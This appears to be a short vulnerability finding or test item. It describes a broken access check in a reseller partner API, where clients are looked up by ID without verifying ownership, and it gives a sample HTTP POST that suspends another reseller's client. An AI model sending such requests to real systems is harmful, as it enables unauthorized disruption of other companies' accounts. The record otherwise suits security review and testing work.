diagnosis: The partner router verifies that the caller has a reseller account, but looks up ClientCompany solely by client_id. It does not check client.reseller_id == reseller.id, allowing a reseller partner to suspend clients managed by competing reseller firms.
exploit_request:
POST /partner/reseller/clients/9941/suspend HTTP/1.1
Host: api.example.com
Authorization: Bearer <reseller_jwt>
